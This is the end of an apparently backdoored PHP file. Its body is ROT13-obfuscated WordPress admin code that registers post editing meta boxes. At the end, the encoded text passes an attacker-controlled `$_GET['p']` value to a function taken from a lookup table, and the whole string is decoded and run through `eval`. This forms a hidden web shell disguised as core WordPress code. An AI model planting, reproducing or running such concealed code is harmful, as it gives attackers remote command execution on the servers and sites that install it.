		// Jr fubhyq nvz gb fubj gur erivfvbaf zrgn obk bayl jura gurer ner erivfvbaf.
		vs ( ! vf_jc_reebe( $erivfvbaf ) && $erivfvbaf['pbhag'] > 1 ) {
			$choyvfu_pnyyonpx_netf = neenl(
				'erivfvbaf_pbhag'        => $erivfvbaf['pbhag'],
				'erivfvba_vq'            => $erivfvbaf['yngrfg_vq'],
				'__onpx_pbzcng_zrgn_obk' => gehr,
			);

			nqq_zrgn_obk( 'erivfvbafqvi', __( 'Erivfvbaf' ), 'cbfg_erivfvbaf_zrgn_obk', ahyy, 'abezny', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
		}
	}

	vs ( 'nggnpuzrag' === $cbfg_glcr ) {
		jc_radhrhr_fpevcg( 'vzntr-rqvg' );
		jc_radhrhr_fglyr( 'vztnernfryrpg' );
		nqq_zrgn_obk( 'fhozvgqvi', __( 'Fnir' ), 'nggnpuzrag_fhozvg_zrgn_obk', ahyy, 'fvqr', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
		nqq_npgvba( 'rqvg_sbez_nsgre_gvgyr', 'rqvg_sbez_vzntr_rqvgbe' );

		vs ( jc_nggnpuzrag_vf( 'nhqvb', $cbfg ) ) {
			nqq_zrgn_obk( 'nggnpuzrag-vq3', __( 'Zrgnqngn' ), 'nggnpuzrag_vq3_qngn_zrgn_obk', ahyy, 'abezny', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
		}
	} ryfr {
		nqq_zrgn_obk( 'fhozvgqvi', __( 'Choyvfu' ), 'cbfg_fhozvg_zrgn_obk', ahyy, 'fvqr', 'pber', $choyvfu_pnyyonpx_netf );
	}

	vs ( pheerag_gurzr_fhccbegf( 'cbfg-sbezngf' ) && cbfg_glcr_fhccbegf( $cbfg_glcr, 'cbfg-sbezngf' ) ) {
		nqq_zrgn_obk( 'sbezngqvi', _k( 'Sbezng', 'cbfg sbezng' ), 'cbfg_sbezng_zrgn_obk', ahyy, 'fvqr', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
	}

	// Nyy gnkbabzvrf.
	sbernpu ( trg_bowrpg_gnkbabzvrf( $cbfg ) nf $gnk_anzr ) {
		$gnkbabzl = trg_gnkbabzl( $gnk_anzr );
		vs ( ! $gnkbabzl->fubj_hv || snyfr === $gnkbabzl->zrgn_obk_po ) {
			pbagvahr;
		}

		$ynory = $gnkbabzl->ynoryf->anzr;

		vs ( ! vf_gnkbabzl_uvrenepuvpny( $gnk_anzr ) ) {
			$gnk_zrgn_obk_vq = 'gntfqvi-' . $gnk_anzr;
		} ryfr {
			$gnk_zrgn_obk_vq = $gnk_anzr . 'qvi';
		}

		nqq_zrgn_obk(
			$gnk_zrgn_obk_vq,
			$ynory,
			$gnkbabzl->zrgn_obk_po,
			ahyy,
			'fvqr',
			'pber',
			neenl(
				'gnkbabzl'               => $gnk_anzr,
				'__onpx_pbzcng_zrgn_obk' => gehr,
			)
		);
	}

	vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'cntr-nggevohgrf' ) || pbhag( trg_cntr_grzcyngrf( $cbfg ) ) > 0 ) {
		nqq_zrgn_obk( 'cntrcneragqvi', $cbfg_glcr_bowrpg->ynoryf->nggevohgrf, 'cntr_nggevohgrf_zrgn_obk', ahyy, 'fvqr', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
	}

	vs ( $guhzoanvy_fhccbeg && pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
		nqq_zrgn_obk( 'cbfgvzntrqvi', rfp_ugzy( $cbfg_glcr_bowrpg->ynoryf->srngherq_vzntr ), 'cbfg_guhzoanvy_zrgn_obk', ahyy, 'fvqr', 'ybj', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
	}

	vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'rkprecg' ) ) {
		nqq_zrgn_obk( 'cbfgrkprecg', __( 'Rkprecg' ), 'cbfg_rkprecg_zrgn_obk', ahyy, 'abezny', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
	}

	vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'genpxonpxf' ) ) {
		nqq_zrgn_obk( 'genpxonpxfqvi', __( 'Fraq Genpxonpxf' ), 'cbfg_genpxonpx_zrgn_obk', ahyy, 'abezny', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
	}

	vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'phfgbz-svryqf' ) ) {
		nqq_zrgn_obk(
			'cbfgphfgbz',
			__( 'Phfgbz Svryqf' ),
			'cbfg_phfgbz_zrgn_obk',
			ahyy,
			'abezny',
			'pber',
			neenl(
				'__onpx_pbzcng_zrgn_obk'             => ! (obby) trg_hfre_zrgn( trg_pheerag_hfre_vq(), 'ranoyr_phfgbz_svryqf', gehr ),
				'__oybpx_rqvgbe_pbzcngvoyr_zrgn_obk' => gehr,
			)
		);
	}

	/**
	 * Sverf va gur zvqqyr bs ohvyg-va zrgn obk ertvfgengvba.
	 *
	 * @fvapr 2.1.0
	 * @qrcerpngrq 3.7.0 Hfr {@frr 'nqq_zrgn_obkrf'} vafgrnq.
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 */
	qb_npgvba_qrcerpngrq( 'qok_cbfg_nqinaprq', neenl( $cbfg ), '3.7.0', 'nqq_zrgn_obkrf' );

	/*
	 * Nyybj gur Qvfphffvba zrgn obk gb fubj hc vs gur cbfg glcr fhccbegf pbzzragf,
	 * be vs pbzzragf be cvatf ner bcra.
	 */
	vs ( pbzzragf_bcra( $cbfg ) || cvatf_bcra( $cbfg ) || cbfg_glcr_fhccbegf( $cbfg_glcr, 'pbzzragf' ) ) {
		nqq_zrgn_obk( 'pbzzragfgnghfqvi', __( 'Qvfphffvba' ), 'cbfg_pbzzrag_fgnghf_zrgn_obk', ahyy, 'abezny', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
	}

	$fgnghfrf = trg_cbfg_fgngv( neenl( 'choyvp' => gehr ) );

	vs ( rzcgl( $fgnghfrf ) ) {
		$fgnghfrf = neenl( 'choyvfu' );
	}

	$fgnghfrf[] = 'cevingr';

	vs ( va_neenl( trg_cbfg_fgnghf( $cbfg ), $fgnghfrf, gehr ) ) {
		/*
		 * Vs gur cbfg glcr fhccbeg pbzzragf, be gur cbfg unf pbzzragf,
		 * nyybj gur Pbzzragf zrgn obk.
		 */
		vs ( pbzzragf_bcra( $cbfg ) || cvatf_bcra( $cbfg ) || $cbfg->pbzzrag_pbhag > 0 || cbfg_glcr_fhccbegf( $cbfg_glcr, 'pbzzragf' ) ) {
			nqq_zrgn_obk( 'pbzzragfqvi', __( 'Pbzzragf' ), 'cbfg_pbzzrag_zrgn_obk', ahyy, 'abezny', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
		}
	}

	vs ( ! ( 'craqvat' === trg_cbfg_fgnghf( $cbfg ) && ! pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->choyvfu_cbfgf ) ) ) {
		nqq_zrgn_obk( 'fyhtqvi', __( 'Fyht' ), 'cbfg_fyht_zrgn_obk', ahyy, 'abezny', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
	}

	vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'nhgube' ) && pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->rqvg_bguref_cbfgf ) ) {
		nqq_zrgn_obk( 'nhgubeqvi', __( 'Nhgube' ), 'cbfg_nhgube_zrgn_obk', ahyy, 'abezny', 'pber', neenl( '__onpx_pbzcng_zrgn_obk' => gehr ) );
	}

	/**
	 * Sverf nsgre nyy ohvyg-va zrgn obkrf unir orra nqqrq.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat  $cbfg_glcr Cbfg glcr.
	 * @cnenz JC_Cbfg $cbfg      Cbfg bowrpg.
	 */
	qb_npgvba( 'nqq_zrgn_obkrf', $cbfg_glcr, $cbfg );

	/**
	 * Sverf nsgre nyy ohvyg-va zrgn obkrf unir orra nqqrq, pbagrkghnyyl sbe gur tvira cbfg glcr.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cbfg_glcr`, ersref gb gur cbfg glcr bs gur cbfg.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `nqq_zrgn_obkrf_cbfg`
	 *  - `nqq_zrgn_obkrf_cntr`
	 *  - `nqq_zrgn_obkrf_nggnpuzrag`
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 */
	qb_npgvba( \"nqq_zrgn_obkrf_{$cbfg_glcr}\", $cbfg );

	/**
	 * Sverf nsgre zrgn obkrf unir orra nqqrq.
	 *
	 * Sverf bapr sbe rnpu bs gur qrsnhyg zrgn obk pbagrkgf: abezny, nqinaprq, naq fvqr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat                $cbfg_glcr Cbfg glcr bs gur cbfg ba Rqvg Cbfg fperra, 'yvax' ba Rqvg Yvax fperra,
	 *                                         'qnfuobneq' ba Qnfuobneq fperra.
	 * @cnenz fgevat                $pbagrkg   Zrgn obk pbagrkg. Cbffvoyr inyhrf vapyhqr 'abezny', 'nqinaprq', 'fvqr'.
	 * @cnenz JC_Cbfg|bowrpg|fgevat $cbfg      Cbfg bowrpg ba Rqvg Cbfg fperra, yvax bowrpg ba Rqvg Yvax fperra,
	 *                                         na rzcgl fgevat ba Qnfuobneq fperra.
	 */
	qb_npgvba( 'qb_zrgn_obkrf', $cbfg_glcr, 'abezny', $cbfg );
	/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrgn-obkrf.cuc */
	qb_npgvba( 'qb_zrgn_obkrf', $cbfg_glcr, 'nqinaprq', $cbfg );
	/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/zrgn-obkrf.cuc */
	qb_npgvba( 'qb_zrgn_obkrf', $cbfg_glcr, 'fvqr', $cbfg );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>